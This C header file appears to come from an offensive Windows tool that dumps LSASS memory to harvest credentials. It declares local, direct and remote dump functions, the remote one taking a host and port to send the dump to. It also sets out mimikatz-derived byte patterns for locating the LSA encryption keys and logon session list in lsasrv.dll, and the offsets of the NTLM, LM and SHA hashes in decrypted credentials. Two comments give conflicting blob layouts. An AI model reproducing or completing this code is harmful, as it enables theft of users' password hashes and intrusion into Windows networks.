#ifndef DUMP_H
#define DUMP_H

#include <windows.h>

BOOL dump_remote(DWORD pid, const char* host, USHORT port);
BOOL dump_local(DWORD pid, const wchar_t* path);
BOOL dump_direct(DWORD pid);

//these match Microsoft's format with 4-byte packing.
//we define our own to avoid pulling in dbghelp.h.

#pragma pack(push, 4)

#define MD_SIGNATURE              0x504D444D   /* 'MDMP' */
#define MD_VERSION                0x0006A793   /* lo=Version, hi=ImplVer */
#define MD_FLAGS_FULL_MEMORY      0x00000002ULL

 /* Stream types */
#define MD_STREAM_SYSTEM_INFO     7
#define MD_STREAM_MODULE_LIST     4
#define MD_STREAM_MEMORY64_LIST   9

typedef struct {
    ULONG32 Signature;
    ULONG32 Version;
    ULONG32 NumberOfStreams;
    ULONG32 StreamDirectoryRva;
    ULONG32 CheckSum;
    ULONG32 TimeDateStamp;
    ULONG64 Flags;
} MD_HEADER;

typedef struct {
    ULONG32 DataSize;
    ULONG32 Rva;
} MD_LOCATION_DESC;

typedef struct {
    ULONG32 StreamType;
    MD_LOCATION_DESC Location;
} MD_DIRECTORY;

typedef struct {
    USHORT  ProcessorArchitecture;
    USHORT  ProcessorLevel;
    USHORT  ProcessorRevision;
    UCHAR   NumberOfProcessors;
    UCHAR   ProductType;
    ULONG32 MajorVersion;
    ULONG32 MinorVersion;
    ULONG32 BuildNumber;
    ULONG32 PlatformId;
    ULONG32 CSDVersionRva;
    USHORT  SuiteMask;
    USHORT  Reserved2;
    UCHAR   CpuInfo[24];
} MD_SYSINFO;

typedef struct {
    ULONG64 BaseOfImage;
    ULONG32 SizeOfImage;
    ULONG32 CheckSum;
    ULONG32 TimeDateStamp;
    ULONG32 ModuleNameRva;
    UCHAR   VersionInfo[52];        /* VS_FIXEDFILEINFO */
    MD_LOCATION_DESC CvRecord;
    MD_LOCATION_DESC MiscRecord;
    ULONG64 Reserved0;
    ULONG64 Reserved1;
} MD_MODULE;

typedef struct {
    ULONG32 NumberOfModules;
    /* MD_MODULE Modules[] follows */
} MD_MODULE_LIST;

typedef struct {
    ULONG32 Length;   /* byte count of Buffer, not including null */
    /* WCHAR Buffer[] follows */
} MD_STRING;

typedef struct {
    ULONG64 StartOfMemoryRange;
    ULONG64 DataSize;
} MD_MEM_DESC64;

typedef struct {
    ULONG64 NumberOfMemoryRanges;
    ULONG64 BaseRva;
    /* MD_MEM_DESC64 Ranges[] follows */
} MD_MEMORY64_LIST;

#pragma pack(pop)

//Byte patterns to locate LsaInitializeProtectedMemory and LogonSessionList in lsasrv.dll.

// Pattern in lsasrv.dll!LsaInitializeProtectedMemory locates: InitializationVector, h3DesKey, hAesKey
  /* Disassembly context:
  *   and [rsp+30h], 0    → 83 64 24 30 00
  *   lea rax, [rbp-20h]  → 48 8D 45 E0
  *   mov r9d, [rbp-28h]  → 44 8B 4D D8
  *   lea rdx, [rip+??]   → 48 8D 15 XX XX XX XX  ← IV
  *
  * The pattern ends at the LEA RDX opcode. The 4-byte RIP-relative displacement to InitializationVector starts at pattern + 16.
  */
#define LSA_CRYPTO_PATTERN \
    "\x83\x64\x24\x30\x00" \
    "\x48\x8d\x45\xe0"     \
    "\x44\x8b\x4d\xd8"     \
    "\x48\x8d\x15"
#define LSA_CRYPTO_PATTERN_LEN  16

  /* Per-build SIGNED offsets from pattern match position to the
   * 4-byte RIP-relative displacement for each global variable.
   * From mimikatz kuhl_m_sekurlsa_nt6.c (x64).
   *
   * Resolution: target = (pat_match + offset) + 4 + *(INT32*)(pat_match + offset)
   * NOTE: des_off is NEGATIVE (h3DesKey ref is BEFORE the pattern).
   */
typedef struct {
    DWORD build_min;
    DWORD build_max;
    INT32 iv_off;        /* → InitializationVector (16 bytes) */
    INT32 des_off;       /* → h3DesKey ptr negative!*/
    INT32 aes_off;       /* → hAesKey ptr */
    DWORD hardkey_off;   /* HARD_KEY in KIWI_BCRYPT_KEY81 */
} LSA_KEY_OFFSETS;

/* Per-build LogonSessionList patterns from mimikatz kuhl_m_sekurlsa_utils.c
 * All x64 patterns. Offset to LogonSessionList displacement = 23,
 * resolved as RIP-relative LEA with instr_len=7.
 */
typedef struct {
    DWORD  build_min;
    DWORD  build_max;
    const BYTE* pattern;
    DWORD  pat_len;
    INT32  list_off;   /* signed offset from pattern to 4-byte disp */
    INT32  count_off;  /* signed offset to LogonSessionListCount disp */
} LSA_LOGON_PATTERN_ENTRY;

/* ================================================================
 * BCRYPT key structure offsets
 *
 * h3DesKey / hAesKey → KIWI_BCRYPT_HANDLE_KEY → KIWI_BCRYPT_KEY81
 *
 * KIWI_BCRYPT_HANDLE_KEY:
 *   +0x00: size (ULONG)
 *   +0x04: tag  (ULONG) = 'UUUR'
 *   +0x08: hAlgorithm (PVOID)
 *   +0x10: key (PVOID) → KIWI_BCRYPT_KEY81
 *
 * KIWI_BCRYPT_KEY81 (Win10):
 *   +0x00: size (ULONG)
 *   +0x04: tag  (ULONG) = 'MSSK' = 0x4B53534D
 *   +0x38: KIWI_HARD_KEY (Win10 1607+):
 *     +0x00: cbSecret (ULONG)
 *     +0x04: data[cbSecret]
 * ================================================================ */

#define BCRYPT_HANDLE_KEY_PTR   0x10   /* offset to key pointer */
#define BCRYPT_KEY81_TAG        0x04
#define HARDKEY_CBSECRET        0x00
#define HARDKEY_DATA            0x04
#define BCRYPT_TAG_MSSK         0x4D53534B  /* 'KSSM' little-endian = "MSSK" */

 /* ================================================================
  * MSV1_0 list entry offsets per OS build
  *
  * These define where LogonId, UserName, Domain and the Credentials
  * pointer live within the KIWI_MSV1_0_LIST structure.
  *
  * IMPORTANT: These offsets are from reverse engineering and may
  * need adjustment for specific builds. Verify with WinDbg if
  * direct mode gives wrong results.
  * ================================================================ */

typedef struct {
    DWORD build_min;
    DWORD build_max;
    DWORD logonid;        /* LUID (8 bytes) */
    DWORD username;       /* UNICODE_STRING (16 bytes on x64) */
    DWORD domain;         /* UNICODE_STRING (16 bytes on x64) */
    DWORD credentials;    /* PVOID → KIWI_MSV1_0_CREDENTIALS */
} MSV_LIST_OFFSETS;

/* Credential chain structure offsets (stable across versions) */
#define MSV_CRED_NEXT           0x00   /* next KIWI_MSV1_0_CREDENTIALS */
#define MSV_CRED_PRIMARY_PTR    0x10   /* → KIWI_MSV1_0_PRIMARY_CREDS */

#define MSV_PCRED_NEXT          0x00   /* next primary creds entry */
#define MSV_PCRED_PRIMARY_STR   0x08   /* ANSI_STRING "Primary" */
#define MSV_PCRED_CREDS_USTR    0x18   /* UNICODE_STRING (encrypted blob) */

/* Decrypted credential blob offsets (Win10 1607+, x64)
 *
 * Layout of decrypted MSV1_0_PRIMARY_CREDENTIAL:
 *   +0x00: LogonDomainName (UNICODE_STRING, 16 bytes - pointer is stale)
 *   +0x10: UserName (UNICODE_STRING, 16 bytes - pointer is stale)
 *   +0x20: isNtOwfPassword  (BOOLEAN)
 *   +0x21: isLmOwfPassword  (BOOLEAN)
 *   +0x22: isShaOwPassword  (BOOLEAN)
 *   +0x23: align[3]
 *   +0x26: NtOwfPassword[16]  ← NTLM hash
 *   +0x36: LmOwfPassword[16]
 *   +0x46: ShaOwPassword[20]
 */
 /* Decrypted MSV1_0_PRIMARY_CREDENTIAL layout (Win10 1607+ / build 14393+):
  * 0x00  LogonDomainName  UNICODE_STRING (16)
  * 0x10  UserName         UNICODE_STRING (16)
  * 0x20  pThis            PVOID          (8)
  * 0x28  isIso            BOOLEAN
  * 0x29  isNtOwfPassword  BOOLEAN
  * 0x2A  isLmOwfPassword  BOOLEAN
  * 0x2B  isShaOwPassword  BOOLEAN
  * 0x2C  isDPAPIProtected BOOLEAN
  * 0x2D  align[3]
  * 0x30  unkD             DWORD
  * 0x34  align2[2]
  * 0x36  ShaOwPassword    BYTE[20]       (SHA1 comes first!)
  * 0x4A  NtOwfPassword    BYTE[16]
  * 0x5A  LmOwfPassword    BYTE[16]
  */
#define DECRYPTED_NTOWF_FLAG    0x29
#define DECRYPTED_NTOWF_HASH    0x4A
#define DECRYPTED_LMOWF_FLAG    0x2A
#define DECRYPTED_LMOWF_HASH    0x5A
#define DECRYPTED_SHA_FLAG      0x2B
#define DECRYPTED_SHA_HASH      0x36
#define DECRYPTED_MIN_SIZE      0x6A   /* 0x5A + 16 (LM) */

#endif /* DUMP_H */